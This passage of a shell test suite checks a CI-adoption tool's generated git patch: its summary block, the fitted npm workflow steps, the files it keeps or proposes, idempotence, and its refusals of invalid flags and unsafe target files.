mk_js() {  # [<package.json text>] -> TGT, OUTD, P: a committed repository holding a package.json (default: a private package with a test script only); PKGLOCK=1 adds a package-lock.json
  mk_repo
  _pj=${1:-}
  [ -n "$_pj" ] || _pj='{"name":"example-app","version":"1.0.0","private":true,"scripts":{"test":"echo EXAMPLE_VALUE"}}'
  printf '%s\n' "$_pj" > "$TGT/package.json"
  if [ "$PKGLOCK" -eq 1 ]; then printf '{}\n' > "$TGT/package-lock.json"; fi
  commit_all "$TGT" pkg
}
do_apply() {  # <label> <kit> <flags...>: the verb on the current TGT, then git apply; rc 0 only when both took
  _dl=$1; _dk=$2; shift 2
  arun "$_dk" "$TGT" --out "$P" "$@"
  rc_is 0 "$_dl: the verb exits 0"
  [ "$RC" -eq 0 ] || return 1
  if g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1; then chk 0 "$_dl: git apply takes the patch"; return 0; fi
  chk 1 "$_dl: git apply takes the patch"; return 1
}
run_apply() {  # <label> <kit> <flags...>: a fresh package repository (PKGJSON, PKGLOCK), the verb, git apply
  _rl=$1; _rk=$2; shift 2
  mk_js "$PKGJSON"
  do_apply "$_rl" "$_rk" "$@"
}
pre_diff() { awk '/^diff --git /{exit} {print}' "$1"; }   # the summary block: every line before the first diff line
patch_paths() { sed -n 's/^diff --git a\/\(.*\) b\/.*$/\1/p' "$1"; }
patch_has_path() { patch_paths "$1" | grep -qxF -- "$2"; }   # <patch> <path>
first_after_checkout() { awk '/^      - /{n++} n == 2 && /^[[:space:]]+id:/{print $2; exit}' "$1"; }   # the id of the first step after the checkout block
disp_is() {  # <label> <id> <apply|na>: that line of the applied conformance/gate-dispositions.txt
  _dv=$(awk -F '\t' -v id="$2" '$1 == id { print $2 }' "$TGT/conformance/gate-dispositions.txt" 2>/dev/null)
  if [ "$_dv" = "$3" ]; then chk 0 "$1: $2 is $3"; else chk 1 "$1: $2 is $3 (got: ${_dv:-none})"; fi
}
disp_all() {  # <label> <lint> <type-check> <test> <build> <provenance>: the eight lines of the file, each id once; secret-scan, dep-scan and sbom are always apply
  _dn=$(awk '!/^[[:space:]]*#/ && !/^[[:space:]]*$/' "$TGT/conformance/gate-dispositions.txt" 2>/dev/null | wc -l | tr -d ' ')
  if [ "$_dn" = 8 ]; then chk 0 "$1: the dispositions file holds the eight ids"; else chk 1 "$1: the dispositions file holds the eight ids (got $_dn lines)"; fi
  disp_is "$1" gate-lint "$2"; disp_is "$1" gate-type-check "$3"; disp_is "$1" gate-test "$4"; disp_is "$1" gate-build "$5"; disp_is "$1" gate-provenance "$6"
  disp_is "$1" gate-secret-scan apply; disp_is "$1" gate-dep-scan apply; disp_is "$1" gate-sbom apply
}
own_tree_ok() {  # <label> <kit>: the kit's ci-gates.sh --own-tree passes on the applied tree
  if sh "$2/conformance/ci-gates.sh" --own-tree "$TGT" >/dev/null 2>&1; then chk 0 "$1: ci-gates.sh --own-tree passes on the applied tree"; else chk 1 "$1: ci-gates.sh --own-tree passes on the applied tree"; fi
}

cell_a9() {  # one patch; the summary block first, every line of it # -led; no diff-like line; no control byte; git apply --check takes it
  mk_js; arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "A9 the full run exits 0"
  [ "$RC" -eq 0 ] || return 0
  if [ "$(ls -A "$OUTD" | wc -l | tr -d ' ')" = 2 ]; then chk 0 "A9 exactly two files exist at --out (the patch and its PR body)"; else chk 1 "A9 exactly two files exist at --out (the patch and its PR body)"; fi
  pre_diff "$P" > "$W/a9.sum"
  case "$(head -n 1 "$P")" in
    "# sparkwright adopt "*) chk 0 "A9 the patch opens with the summary block" ;;
    *) chk 1 "A9 the patch opens with the summary block" ;;
  esac
  if [ -s "$W/a9.sum" ] && [ "$(grep -c '^diff --git ' "$P")" -ge 1 ]; then chk 0 "A9 the summary block is followed by the diff"; else chk 1 "A9 the summary block is followed by the diff"; fi
  if awk '/^diff --git /{exit} !/^#( |$)/{bad=1} {l=$0; sub(/^# ?/, "", l); if (l ~ /^(diff |--- |\+\+\+ |@@ |index )/) bad=1} END{exit bad+0}' "$P"; then chk 0 "A9 every summary line starts with a hash and none reads as a diff line"; else chk 1 "A9 every summary line starts with a hash and none reads as a diff line"; fi
  if [ -z "$(LC_ALL=C tr -d '\011\012\040-\176\200-\377' < "$W/a9.sum")" ]; then chk 0 "A9 the summary holds no control byte"; else chk 1 "A9 the summary holds no control byte"; fi
  if g -C "$TGT" apply --whitespace=nowarn --check "$P" >/dev/null 2>&1; then chk 0 "A9 git apply --check takes the patch with its summary"; else chk 1 "A9 git apply --check takes the patch with its summary"; fi
}

a10_full() {  # <kit>: after a Jira, solo run the applied tree holds R, W, T, K, C, D, O and S
  for _ac in ci control-plane-ratification backlog-presence ceremony-binding loop-state tracker-board-gates solo-go-bound; do
    if grep -qx "$_ac" "$TGT/REQUIRED-CHECKS.md" 2>/dev/null; then chk 0 "A10 REQUIRED-CHECKS.md declares $_ac"; else chk 1 "A10 REQUIRED-CHECKS.md declares $_ac"; fi
  done
  file_has "$TGT/REQUIRED-CHECKS.md" "example-app" "A10 REQUIRED-CHECKS.md carries the --name"
  file_lacks "$TGT/REQUIRED-CHECKS.md" "[Project Name]" "A10 REQUIRED-CHECKS.md holds no [Project Name] slot"
  if cmp -s "$1/templates/WAIVER-REGISTER.md" "$TGT/WAIVER-REGISTER.md"; then chk 0 "A10 WAIVER-REGISTER.md is byte-identical to the template (no row)"; else chk 1 "A10 WAIVER-REGISTER.md is byte-identical to the template (no row)"; fi
  if sh "$1/scripts/tracker-conf.sh" "$TGT/.kit/tracker.conf" >/dev/null 2>&1; then chk 0 "A10 .kit/tracker.conf passes tracker-conf.sh"; else chk 1 "A10 .kit/tracker.conf passes tracker-conf.sh"; fi
  file_has "$TGT/.kit/tracker.conf" "base_url=https://example.atlassian.net" "A10 .kit/tracker.conf carries the given url"
  file_has "$TGT/.kit/tracker.conf" "project=EXMP" "A10 .kit/tracker.conf carries the given project"
  exists "$TGT/JIRA-SETUP.md" "A10 JIRA-SETUP.md is proposed"
  for _aw in ratification adopter-gates adopter-tracker-gates adopter-trunk-trace solo-go; do
    if cmp -s "$1/profiles/$_aw.yml" "$TGT/.github/workflows/$_aw.yml"; then chk 0 "A10 workflow $_aw.yml is byte-identical to its profile"; else chk 1 "A10 workflow $_aw.yml is byte-identical to its profile"; fi
  done
  exists "$TGT/.github/workflows/ci.yml" "A10 the fitted ci.yml is proposed"
  exists "$TGT/conformance/gate-dispositions.txt" "A10 conformance/gate-dispositions.txt is proposed"
  _oa=$(awk '!/^[[:space:]]*#/ && !/^[[:space:]]*$/' "$TGT/.github/CODEOWNERS" 2>/dev/null | grep -c '@example-owner' || true)
  _on=$(awk '!/^[[:space:]]*#/ && !/^[[:space:]]*$/' "$TGT/.github/CODEOWNERS" 2>/dev/null | wc -l | tr -d ' ')
  if [ "$_oa" = 1 ] && [ "$_on" = 1 ]; then chk 0 "A10 CODEOWNERS has one active line, the --owner seed"; else chk 1 "A10 CODEOWNERS has one active line, the --owner seed (seed $_oa, active $_on)"; fi
  file_has "$TGT/.github/CODEOWNERS" "# /.github/" "A10 CODEOWNERS has the kit rules commented out"
  if [ "$(cat "$TGT/.kit/dials.conf" 2>/dev/null)" = "MERGE_RELATIONSHIP=solo" ]; then chk 0 "A10 .kit/dials.conf holds the one solo line"; else chk 1 "A10 .kit/dials.conf holds the one solo line"; fi
}
a10_bp_skipped() {  # a tracker backend: the branch-protection leg is skipped and says why, in the output and in the summary's owed list; it did not run
  has "$BP_SKIP_LINE" "$1: the output names the skipped branch-protection leg and what is owed"
  hasnt "conformance/branch-protection.sh --declared-only passed" "$1: the branch-protection leg did not run"
  pre_diff "$P" > "$W/a10.sum"
  file_has "$W/a10.sum" "$BP_SKIP_LINE" "$1: the summary's owed list carries the same line"
}
cell_a10() {
  if run_apply "A10 jira solo" "$1" $FULLF; then a10_full "$1"; a10_bp_skipped "A10 jira solo"; fi
  if run_apply "A10 md solo" "$1" --team solo; then
    has "conformance/branch-protection.sh --declared-only passed" "A10 md: the branch-protection leg ran and passed"
    absent "$TGT/.kit/tracker.conf" "A10 md: no .kit/tracker.conf"
    absent "$TGT/JIRA-SETUP.md" "A10 md: no JIRA-SETUP.md"
    if grep -qx 'tracker-board-gates' "$TGT/REQUIRED-CHECKS.md" 2>/dev/null; then chk 1 "A10 md: no tracker-board-gates line"; else chk 0 "A10 md: no tracker-board-gates line"; fi
  fi
  if run_apply "A10 jira team" "$1" --team team --backlog jira --tracker-url https://example.atlassian.net --tracker-project EXMP; then
    a10_bp_skipped "A10 jira team"
    absent "$TGT/.kit/dials.conf" "A10 team: no .kit/dials.conf"
    if grep -qx 'solo-go-bound' "$TGT/REQUIRED-CHECKS.md" 2>/dev/null; then chk 1 "A10 team: no solo-go-bound line"; else chk 0 "A10 team: no solo-go-bound line"; fi
  fi
}

a11_base() {  # <kit>: no lockfile, a test script only, a private package: no build, no pack
  PKGJSON=""; PKGLOCK=0
  run_apply "A11 no lockfile" "$1" $FULLF || return 0
  _ci="$TGT/.github/workflows/ci.yml"
  if [ "$(head -n 1 "$_ci" 2>/dev/null)" = "# kit-pipeline-origin: emitted" ]; then chk 0 "A11 line 1 is the origin marker"; else chk 1 "A11 line 1 is the origin marker"; fi
  if [ "$(first_after_checkout "$_ci")" = gate-secret-scan ]; then chk 0 "A11 the first step after the checkout is gate-secret-scan"; else chk 1 "A11 the first step after the checkout is gate-secret-scan"; fi
  file_has "$_ci" "run: npm install" "A11 no lockfile: npm install"
  file_lacks "$_ci" "npm ci" "A11 no lockfile: no npm ci"
  file_lacks "$_ci" "cache: npm" "A11 no lockfile: no cache: npm"
  file_has "$_ci" "run: npm test" "A11 only a test script: npm test"
  file_lacks "$_ci" "npm run lint" "A11 no lint script: no npm run lint"
  file_lacks "$_ci" "npm run type-check" "A11 no type-check script: no npm run type-check"
  file_lacks "$_ci" "npm run test:coverage" "A11 no test:coverage script: no npm run test:coverage"
  file_lacks "$_ci" "npm run build" "A11 no build script: no npm run build"
  file_lacks "$_ci" "kit:db-backed" "A11 no --db: no kit:db-backed line"
  file_lacks "$_ci" "Upload build artifact" "A11 no build and no pack: no upload step"
  file_lacks "$_ci" "Build provenance skipped" "A11 no build and no pack: no notice step"
  file_lacks "$_ci" "  provenance:" "A11 no build and no pack: no provenance job"
  disp_all "A11 no lockfile" na na apply na na
  own_tree_ok "A11 no lockfile" "$1"
}
a11_lock_db() {  # <kit>: a committed lockfile gives npm ci and the cache; --db keeps the db region
  PKGJSON=""; PKGLOCK=1
  run_apply "A11 lockfile and --db" "$1" $FULLF --db || { PKGLOCK=0; return 0; }
  PKGLOCK=0
  _ci="$TGT/.github/workflows/ci.yml"
  file_has "$_ci" "run: npm ci" "A11 a lockfile: npm ci"
  file_has "$_ci" "cache: npm" "A11 a lockfile: cache: npm stays"
  file_lacks "$_ci" "npm install" "A11 a lockfile: no npm install"
  file_has "$_ci" "# >>> kit:db-backed" "A11 --db keeps the kit:db-backed region"
}
a11_build() {  # <kit>: with a build script, the upload, the notice and the provenance job are the profile's, byte for byte
  PKGJSON='{"name":"example-app","version":"1.0.0","scripts":{"lint":"x","type-check":"x","test:coverage":"x","build":"x"}}'
  run_apply "A11 a build script" "$1" $FULLF || { PKGJSON=""; return 0; }
  PKGJSON=""
  _ci="$TGT/.github/workflows/ci.yml"
  file_has "$_ci" "npm run lint" "A11 a lint script: npm run lint"
  file_has "$_ci" "npm run type-check" "A11 a type-check script: npm run type-check"
  file_has "$_ci" "npm run test:coverage" "A11 a test:coverage script: npm run test:coverage"
  file_has "$_ci" "npm run build" "A11 a build script: npm run build"
  _tail_a=$(sed -n '/Upload build artifact/,$p' "$_ci"); _tail_b=$(sed -n '/Upload build artifact/,$p' "$1/profiles/typescript-node/ci.yml")
  if [ -n "$_tail_a" ] && [ "$_tail_a" = "$_tail_b" ]; then chk 0 "A11 a build script: the upload, the notice and the provenance job are byte-identical to the profile"; else chk 1 "A11 a build script: the upload, the notice and the provenance job are byte-identical to the profile"; fi
  disp_all "A11 a build script" apply apply apply apply apply
}
a11_pack() {  # <kit>: no build script, a public package with a name and a version: npm pack, and the provenance job stays
  PKGJSON='{"name":"example-app","version":"1.0.0","scripts":{"test":"x"}}'
  run_apply "A11 npm pack" "$1" $FULLF || { PKGJSON=""; return 0; }
  PKGJSON=""
  _ci="$TGT/.github/workflows/ci.yml"
  file_has "$_ci" "npm pack --pack-destination pack" "A11 npm pack: gate-build packs"
  file_has "$_ci" "path: pack/*.tgz" "A11 npm pack: the upload path is pack/*.tgz"
  file_lacks "$_ci" "path: dist/**" "A11 npm pack: no dist upload path"
  file_has "$_ci" "  provenance:" "A11 npm pack: the provenance job stays"
  disp_all "A11 npm pack" na na apply apply apply
}
a11_profile() {  # <kit>: the fitter on the REAL shipped profile (copied into a throwaway kit; $ROOT is read, never written) gives the expected step order
  SEQ=$((SEQ + 1)); _pk="$W/f$SEQ"; cp -Rp "$1" "$_pk"
  cp "$ROOT/profiles/typescript-node/ci.yml" "$_pk/profiles/typescript-node/ci.yml"
  PKGJSON='{"name":"example-app","version":"1.0.0","scripts":{"lint":"x","type-check":"x","test:coverage":"x","build":"x"}}'; PKGLOCK=1
  run_apply "A11 the real profile" "$_pk" $FULLF || { PKGJSON=""; PKGLOCK=0; return 0; }
  PKGJSON=""; PKGLOCK=0
  _want="gate-secret-scan detect-dockerfile gate-install gate-lint gate-type-check gate-test gate-eval gate-build gate-dep-scan gate-sbom gate-sast gate-license gate-agent-trace gate-image-sbom gate-image-vuln gate-provenance image build-push gate-image-provenance"
  _got=$(sed -n 's/^[[:space:]]*id:[[:space:]]*\(.*\)$/\1/p' "$TGT/.github/workflows/ci.yml" | tr '\n' ' ' | sed 's/ $//')
  if [ "$_got" = "$_want" ]; then chk 0 "A11 the real profile: the fitted step ids are in the expected order"; else chk 1 "A11 the real profile: the fitted step ids are in the expected order (got: $_got)"; fi
  a11_real_nobuild "$_pk"
}
a11_real_nobuild() {  # <throwaway kit holding the real profile>: with no build and no pack the provenance job goes and the image-provenance job survives, byte for byte
  PKGJSON='{"name":"example-app","version":"1.0.0","private":true,"scripts":{"test":"x"}}'
  run_apply "A11 the real profile with no build" "$1" $FULLF || { PKGJSON=""; return 0; }
  PKGJSON=""
  _ci="$TGT/.github/workflows/ci.yml"
  file_lacks "$_ci" "  provenance:" "A11 the real profile with no build: the provenance job is gone"
  file_has "$_ci" "  image-provenance:" "A11 the real profile with no build: image-provenance stays"
  _tail_a=$(sed -n '/^  image-provenance:/,$p' "$_ci"); _tail_b=$(sed -n '/^  image-provenance:/,$p' "$1/profiles/typescript-node/ci.yml")
  if [ -n "$_tail_a" ] && [ "$_tail_a" = "$_tail_b" ]; then chk 0 "A11 the real profile with no build: the image-provenance job is byte-identical to the profile"; else chk 1 "A11 the real profile with no build: the image-provenance job is byte-identical to the profile"; fi
}
cell_a11() { a11_base "$1"; a11_lock_db "$1"; a11_build "$1"; a11_pack "$1"; a11_profile "$1"; }

cell_a12() {  # the proposed waiver rows are in the summary NOTES and in no hunk; board_governance_row's text is incept's
  run_apply "A12" "$1" $FULLF || return 0
  pre_diff "$P" > "$W/a12.sum"; sed -n '/^diff --git /,$p' "$P" > "$W/a12.hunks"
  _d=$(date -u +%Y-%m-%d)
  _row=$( . "$1/scripts/stamp-lib.sh"; board_governance_row jira "$_d" )
  file_has "$W/a12.sum" "$_row" "A12 the summary NOTES carry the board-governance row incept stamps for jira and today's date"
  file_has "$W/a12.sum" "| branch-protection-plan |" "A12 the summary NOTES carry the branch-protection-plan row"
  file_has "$W/a12.sum" "Not proposed" "A12 the summary NOTES say which waiver rows are not proposed"
  file_lacks "$W/a12.hunks" "| board-governance | The kit reads" "A12 no hunk holds the board-governance row"
  file_lacks "$W/a12.hunks" "| branch-protection-plan |" "A12 no hunk holds the branch-protection-plan row"
  if cmp -s "$1/templates/WAIVER-REGISTER.md" "$TGT/WAIVER-REGISTER.md"; then chk 0 "A12 the applied register is the template, byte for byte"; else chk 1 "A12 the applied register is the template, byte for byte"; fi
}

A13_FILES=".github/workflows/main.yml .github/workflows/ci.yml .github/CODEOWNERS REQUIRED-CHECKS.md WAIVER-REGISTER.md"
a13_main() {  # <kit>: the adopter's own CI, CODEOWNERS, REQUIRED-CHECKS.md and WAIVER-REGISTER.md are in no hunk and stay byte for byte
  mk_js; mkdir -p "$TGT/.github/workflows"
  printf 'name: EXAMPLE adopter main\n' > "$TGT/.github/workflows/main.yml"
  printf 'name: EXAMPLE adopter ci\n' > "$TGT/.github/workflows/ci.yml"
  printf '* @example-adopter-team\n' > "$TGT/.github/CODEOWNERS"
  printf 'adopter-check\n' > "$TGT/REQUIRED-CHECKS.md"
  printf '# EXAMPLE adopter waiver register\n' > "$TGT/WAIVER-REGISTER.md"
  commit_all "$TGT" own
  ( cd "$TGT" && cksum $A13_FILES ) > "$W/a13.before"
  do_apply "A13 the adopter's own files" "$1" $FULLF || return 0
  ( cd "$TGT" && cksum $A13_FILES ) > "$W/a13.after"
  if cmp -s "$W/a13.before" "$W/a13.after"; then chk 0 "A13 each of the adopter's files is byte-identical after the apply"; else chk 1 "A13 each of the adopter's files is byte-identical after the apply"; fi
  pre_diff "$P" > "$W/a13.sum"
  file_has "$W/a13.sum" "[kept]" "A13 the summary has a kept line"
  for _af in $A13_FILES; do
    if patch_has_path "$P" "$_af"; then chk 1 "A13 no hunk for $_af"; else chk 0 "A13 no hunk for $_af"; fi
    file_has "$W/a13.sum" "$_af" "A13 the summary names $_af"
  done
  if patch_has_path "$P" conformance/gate-dispositions.txt; then chk 1 "A13 an adopter ci.yml makes area D absent"; else chk 0 "A13 an adopter ci.yml makes area D absent"; fi
}
a13_ci_absent() {  # <kit>: with area C absent a stamped REQUIRED-CHECKS.md carries the commented ci line, not a live one (M3)
  mk_js; mkdir -p "$TGT/.github/workflows"
  printf 'name: EXAMPLE adopter ci\n' > "$TGT/.github/workflows/ci.yml"; commit_all "$TGT" own
  do_apply "A13 an adopter ci.yml only" "$1" $FULLF || return 0
  exists "$TGT/REQUIRED-CHECKS.md" "A13 REQUIRED-CHECKS.md is stamped"
  if grep -qx 'ci' "$TGT/REQUIRED-CHECKS.md" 2>/dev/null; then chk 1 "A13 area C absent: no live ci line"; else chk 0 "A13 area C absent: no live ci line"; fi
  file_has "$TGT/REQUIRED-CHECKS.md" "# ci " "A13 area C absent: the commented ci line"
  absent "$TGT/conformance/gate-dispositions.txt" "A13 area C absent: no dispositions file"
  if [ "$(cat "$TGT/.github/workflows/ci.yml")" = "name: EXAMPLE adopter ci" ]; then chk 0 "A13 the adopter ci.yml is untouched"; else chk 1 "A13 the adopter ci.yml is untouched"; fi
}
a13_owners() {  # <kit>: a lone root or docs/ CODEOWNERS is never shadowed by a .github/ one (M4)
  for _oc in CODEOWNERS docs/CODEOWNERS; do
    mk_js; mkdir -p "$TGT/$(dirname "$_oc")"; printf '* @example-adopter-team\n' > "$TGT/$_oc"; commit_all "$TGT" own
    do_apply "A13 a lone $_oc" "$1" $FULLF || continue
    absent "$TGT/.github/CODEOWNERS" "A13 a lone $_oc: no .github/CODEOWNERS is proposed"
    if [ "$(cat "$TGT/$_oc")" = "* @example-adopter-team" ]; then chk 0 "A13 a lone $_oc: it is untouched"; else chk 1 "A13 a lone $_oc: it is untouched"; fi
  done
}
a13_disp_only() {  # <kit>: an adopter dispositions file and no ci.yml: the fitted ci.yml is proposed, the file is kept and never rewritten, and the summary says whose file judges the dropped gates
  PKGJSON='{"name":"example-app","version":"1.0.0","scripts":{"lint":"x","type-check":"x","test:coverage":"x","build":"x"}}'
  mk_js "$PKGJSON"; PKGJSON=""
  mkdir -p "$TGT/conformance"
  for _dg in gate-lint gate-type-check gate-test gate-build gate-secret-scan gate-dep-scan gate-sbom gate-provenance; do printf '%s\t%s\n' "$_dg" apply; done > "$TGT/conformance/gate-dispositions.txt"
  commit_all "$TGT" own
  ( cd "$TGT" && cksum conformance/gate-dispositions.txt ) > "$W/a13d.before"
  do_apply "A13 an adopter dispositions file and no ci.yml" "$1" $FULLF || return 0
  ( cd "$TGT" && cksum conformance/gate-dispositions.txt ) > "$W/a13d.after"
  if cmp -s "$W/a13d.before" "$W/a13d.after"; then chk 0 "A13 the adopter dispositions file is byte-identical after the apply"; else chk 1 "A13 the adopter dispositions file is byte-identical after the apply"; fi
  if patch_has_path "$P" conformance/gate-dispositions.txt; then chk 1 "A13 an adopter dispositions file: no hunk for it"; else chk 0 "A13 an adopter dispositions file: no hunk for it"; fi
  exists "$TGT/.github/workflows/ci.yml" "A13 an adopter dispositions file: the fitted ci.yml is still proposed"
  pre_diff "$P" > "$W/a13d.sum"
  file_has "$W/a13d.sum" "judged against your own conformance/gate-dispositions.txt" "A13 the summary says the dropped gates are judged against the adopter's own file"
  file_lacks "$W/a13d.sum" "You accept each line by applying it" "A13 the summary does not claim to propose a dispositions file it kept out"
}
cell_a13() { a13_main "$1"; a13_ci_absent "$1"; a13_owners "$1"; a13_disp_only "$1"; }

mapped_snapshot() {  # <repo>: the checksum of every .kit-manifest path inside SWAS-1008's mapped set (design 7's stand-in until conformance/selftest-inputs.tsv exists)
  ( cd "$1" && while IFS= read -r _mf; do
      case "$_mf" in
        .claude/*|scripts/*|conformance/*|hooks/*|adapters/*|profiles/*|templates/*|.kit/*) cksum "$_mf" ;;
      esac
    done < .kit-manifest )
}
a14_allowed() {  # <path>: rc 0 iff it is a new-area path or one of design 7's named exceptions
  case "$1" in
    REQUIRED-CHECKS.md|WAIVER-REGISTER.md|JIRA-SETUP.md|.kit/tracker.conf|.kit/dials.conf|conformance/gate-dispositions.txt|.github/CODEOWNERS|.github/workflows/*.yml|CLAUDE.md|AGENTS.md|.gitignore) return 0 ;;
  esac
  return 1
}
a14_forward() {  # the forward leg: no line of 1008's conformance/selftest-inputs.tsv matches a patch path; N-A until that file exists (the first tab field is read as a glob [inferred])
  _tsv="$ROOT/conformance/selftest-inputs.tsv"
  if [ ! -f "$_tsv" ]; then chk 0 "A14 forward leg N-A: conformance/selftest-inputs.tsv is absent until SWAS-1008 slice 3 lands"; return 0; fi
  _tab=$(printf '\t'); _fh=0
  for _pp in $(patch_paths "$P"); do
    while IFS= read -r _tl; do
      case "$_tl" in
        ''|'#'*) continue ;;
      esac
      _glob=${_tl%%"$_tab"*}
      # shellcheck disable=SC2254  # the tsv field is a glob pattern on purpose (A14 forward leg)
      case "$_pp" in
        $_glob) _fh=1 ;;
      esac
    done < "$_tsv"
  done
  if [ "$_fh" -eq 0 ]; then chk 0 "A14 forward leg: no line of selftest-inputs.tsv matches a path in the patch"; else chk 1 "A14 forward leg: no line of selftest-inputs.tsv matches a path in the patch"; fi
}
cell_a14() {  # the SWAS-1008 byte identity: a target carrying the copy-in has its mapped set unchanged, and the patch meets it nowhere
  mk_js
  for _cd in scripts conformance profiles templates adapters .claude; do cp -Rp "$1/$_cd" "$TGT/$_cd"; done
  ( cd "$TGT" && find scripts conformance profiles templates adapters .claude -type f | LC_ALL=C sort > .kit-manifest )
  commit_all "$TGT" copy-in
  mapped_snapshot "$TGT" > "$W/a14.before"
  do_apply "A14 a target with the copy-in" "$1" $FULLF || return 0
  mapped_snapshot "$TGT" > "$W/a14.after"
  if [ -s "$W/a14.before" ] && cmp -s "$W/a14.before" "$W/a14.after"; then chk 0 "A14 every file of the mapped set is byte-identical after the apply"; else chk 1 "A14 every file of the mapped set is byte-identical after the apply"; fi
  _hit=0; _odd=0
  for _pp in $(patch_paths "$P"); do
    if grep -qxF -- "$_pp" "$TGT/.kit-manifest"; then _hit=1; fi
    a14_allowed "$_pp" || _odd=1
  done
  if [ "$_hit" -eq 0 ]; then chk 0 "A14 the patch's file list meets the mapped set nowhere"; else chk 1 "A14 the patch's file list meets the mapped set nowhere"; fi
  if [ "$_odd" -eq 0 ]; then chk 0 "A14 every patch path is a new-area path or a named exception"; else chk 1 "A14 every patch path is a new-area path or a named exception"; fi
  a14_forward
}

cell_a16() {  # idempotence: a second run on the applied, committed tree writes no file and says nothing is left
  run_apply "A16 the first run" "$1" $FULLF || return 0
  commit_all "$TGT" adopted; snap "$TGT" > "$W/a16.before"; P="$OUTD/second.patch"
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "A16 the second run exits 0"
  has "already adopted: nothing to patch" "A16 the second run says nothing is left to patch"
  absent "$P" "A16 the second run writes no file"
  absent "$P.pr.md" "A16 the second run writes no PR body"
  snap "$TGT" > "$W/a16.after"
  if cmp -s "$W/a16.before" "$W/a16.after"; then chk 0 "A16 the second run leaves the target unchanged"; else chk 1 "A16 the second run leaves the target unchanged"; fi
}

a17_case() {  # <label> <needle> <flags...>: on the current TGT, a refusal of that value (exit 2, nothing written), never the unknown-flag refusal
  _al=$1; _an=$2; shift 2
  arun "$_k17" "$TGT" --out "$P" "$@"
  refused "A17 $_al" "$_an"
  hasnt "unknown flag" "A17 $_al is refused for its value, not as an unknown flag"
}
a17_strict() {  # <kit>: a package.json that fails the strict test exits 0, refuses area C and D, and composes the rest
  mk_js '{"name":"example-app","scripts":{"test":"x"},"scripts":{"test":"y"}}'
  arun "$1" "$TGT" --out "$P" $FULLF
  rc_is 0 "A17 a package.json that is not strict JSON: the verb exits 0"
  [ "$RC" -eq 0 ] || return 0
  pre_diff "$P" > "$W/a17.sum"
  file_has "$W/a17.sum" "[ci] refused: package.json is not strict JSON" "A17 the summary says area C is refused"
  if patch_has_path "$P" .github/workflows/ci.yml; then chk 1 "A17 a refused area C has no ci.yml hunk"; else chk 0 "A17 a refused area C has no ci.yml hunk"; fi
  if patch_has_path "$P" conformance/gate-dispositions.txt; then chk 1 "A17 a refused area C has no dispositions hunk"; else chk 0 "A17 a refused area C has no dispositions hunk"; fi
  if patch_has_path "$P" REQUIRED-CHECKS.md; then chk 0 "A17 the rest of the patch is still composed"; else chk 1 "A17 the rest of the patch is still composed"; fi
}
cell_a17() {  # refusals: exit 2, nothing written (the exit-1 tracker-conf.sh leg has no value that passes the parse pattern and fails that script)
  _k17=$1
  mk_js; a17_case "no --team" "--team"
  a17_case "an unknown --backlog" "" --team solo --backlog nosuch
  a17_case "--existing with md" "" --team solo --existing
  a17_case "an unknown --stack" "" --team solo --stack nosuch
  a17_case "a --name that fails its pattern" "" --team solo --name "bad name!"
  a17_case "a --tracker-url that is not https" "" --team solo --backlog jira --tracker-url http://example.atlassian.net --tracker-project EXMP
  a17_case "a --tracker-url with an uppercase host (erratum E1)" "" --team solo --backlog jira --tracker-url https://Example.atlassian.net --tracker-project EXMP
  a17_case "a --tracker-project that fails its pattern" "" --team solo --backlog jira --tracker-url https://example.atlassian.net --tracker-project lower
  mk_repo; a17_case "no package.json and no --stack" "--stack" --team solo
  mk_js; printf 'EXAMPLE\n' > "$TGT/.gitlab-ci.yml"; commit_all "$TGT" gl
  a17_case "a .gitlab-ci.yml with no --ci" "--ci" --team solo
  mk_js; ln -s "$W/ext$SEQ.rc" "$TGT/REQUIRED-CHECKS.md"; commit_all "$TGT" link
  a17_case "a symlinked REQUIRED-CHECKS.md" "symbolic link" --team solo
  mk_js; printf 'EXAMPLE\n' > "$TGT/REQUIRED-CHECKS.md"; commit_all "$TGT" rc; printf 'EXAMPLE edited\n' > "$TGT/REQUIRED-CHECKS.md"
  a17_case "a dirty REQUIRED-CHECKS.md" "commit the copy-in first" --team solo
  a17_strict "$1"
}

cell_a18() {  # --guard-only gives today's patch with no --team or --ci; A1 to A8 run under it, unchanged; a bare call refuses and names both routes
  mk_repo; arun "$1" "$TGT" --out "$P"
  refused "A18 a bare call with no --team and no --guard-only" "--guard-only"
  has "--team" "A18 the bare-call refusal names the --team route"
  mk_repo; arun "$1" "$TGT" --out "$P" --guard-only
  rc_is 0 "A18 --guard-only with no --team and no --ci exits 0"
  if [ "$RC" -eq 0 ]; then
    _gbad=0
    for _gp in $(patch_paths "$P"); do
      case "$_gp" in
        .claude/settings.json|.claude/hooks/guard.sh|.claude/hooks/guard-core.sh|.gitignore|CLAUDE.md|AGENTS.md) : ;;
        *) _gbad=1 ;;
      esac
    done
    if [ "$_gbad" -eq 0 ]; then chk 0 "A18 --guard-only patches only today's six paths"; else chk 1 "A18 --guard-only patches only today's six paths"; fi
  fi
  ARUN_EXTRA="--guard-only"; CHK_TAG="A18 guard-only: "
  for _ac in cell_a1 cell_a2 cell_a3 cell_a4 cell_a5 cell_a6 cell_a7 cell_a8; do
    mk_kit; "$_ac" "$KITDIR"
    rm -rf "$KITDIR" "$W"/t[0-9]* "$W"/o[0-9]* "$W"/f[0-9]* "$W"/ext* "$W"/plain*
  done
  ARUN_EXTRA=""; CHK_TAG=""
}

# --- cells A19-A26 (SWAS-1011, design 7): the lint and test command detector; the fixture target holds a committed copy-in (.kit-manifest and the files it names) and the adopter's own index.js ---
mk_lint() {  # <package.json text> <full|bf|nomanifest|nopkg> -> TGT, OUTD, P: full = a copy-in made without --brownfield (its manifest names a scaffold test file); bf = the same without that file; nomanifest = no .kit-manifest; nopkg = no package.json
  if [ "$2" = nopkg ]; then mk_repo; else mk_js "$1"; fi
  mkdir -p "$TGT/conformance" "$TGT/profiles/p" "$TGT/skills/s" "$TGT/scripts"
  printf 'echo x\n' > "$TGT/conformance/x.sh"; printf 'name: p\n' > "$TGT/profiles/p/ci.yml"
  printf '# s\n' > "$TGT/skills/s/SKILL.md"; printf 'echo k\n' > "$TGT/scripts/k.sh"; printf 'console.log(1);\n' > "$TGT/index.js"
  if [ "$2" != nomanifest ]; then
    printf '%s\n' conformance/x.sh profiles/p/ci.yml scripts/k.sh skills/s/SKILL.md > "$TGT/.kit-manifest"
    if [ "$2" != bf ]; then
